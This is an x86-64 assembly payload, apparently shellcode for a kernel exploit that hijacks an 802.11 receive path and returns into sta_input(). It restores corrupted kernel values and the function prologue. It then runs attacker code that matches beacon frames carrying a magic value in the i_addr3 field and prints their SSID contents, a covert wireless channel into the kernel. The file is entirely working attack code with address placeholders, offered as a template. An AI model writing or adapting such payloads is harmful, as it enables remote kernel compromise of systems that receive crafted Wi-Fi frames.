	.globl	_start
	.code64

_start:
	// Correct the 'data' value.
	movabs	$DATA_ADDRESS,%rax
	movabs	$DATA_VALUE,%r11
	movq	%r11,(%rax)

	// Correct the 'len' value.
	addq	$8,%rax
	movl	$LEN_VALUE,(%rax)

	// Save the return RIP in RAX.
	popq	%rax

	// Execute the expected prologue
	pushq	%rbp
	movq	%rsp,%rbp
	pushq	%r15
	pushq	%r14
	pushq	%r13
	pushq	%r12

	// Push the return RIP, to RET into later on.
	pushq	%rax

	// ---------------------------------------------------------------------
	// ------ BEGIN: YOUR OWN CODE IN HERE ---------------------------------
	// ---------------------------------------------------------------------

	// Save the arguments.
	pushq	%rdi
	pushq	%rsi
	pushq	%rdx
	pushq	%rcx
	pushq	%r8
	pushq	%r9

	// The mbuf is in RSI. Read "m->m_data" into RCX.
	movq	2*8(%rsi),%rcx

	// RCX points to a ieee80211_frame:
	//
	//	#define IEEE80211_ADDR_LEN 6
	// 	struct ieee80211_frame {
	// 		uint8_t		i_fc[2];
	// 		uint8_t		i_dur[2];
	// 		uint8_t		i_addr1[IEEE80211_ADDR_LEN];
	// 		uint8_t		i_addr2[IEEE80211_ADDR_LEN];
	// 		uint8_t		i_addr3[IEEE80211_ADDR_LEN];
	// 		uint8_t		i_seq[2];
	// 	} __packed;
	//
	// Advance to the i_addr3 field.
	addq	$2+2+6+6,%rcx

	// Compare with our password.
	cmpl	$0xCCD10BB0,2(%rcx)
	jne	out

	// Advance to the end of the ieee80211_frame (6+2).
	// Skip the beacon header (12).
	// Skip the SSID header (2).
	addq	$(6+2)+12+2,%rcx

	// RCX now points to the SSID string. The first 8 bytes is lastnum.
	movq	(%rcx),%rax
	addq	$8,%rcx

	// If we already received that frame, discard.	
	movq	lastnum(%rip),%rdx
	cmpq	%rax,%rdx
	je	out

	// Set lastnum.
	movq	%rax,lastnum(%rip)

	// Call printf.
	movq	%rcx,%rdi
	movabs	$PRINTF_ADDRESS,%rax
	callq	*%rax

out:
	// Restore the arguments.
	popq	%r9
	popq	%r8
	popq	%rcx
	popq	%rdx
	popq	%rsi
	popq	%rdi

	// ---------------------------------------------------------------------
	// ------ END OF YOUR CODE ---------------------------------------------
	// ---------------------------------------------------------------------

	// Return back to sta_input().
	retq

lastnum:
	.quad	0x00

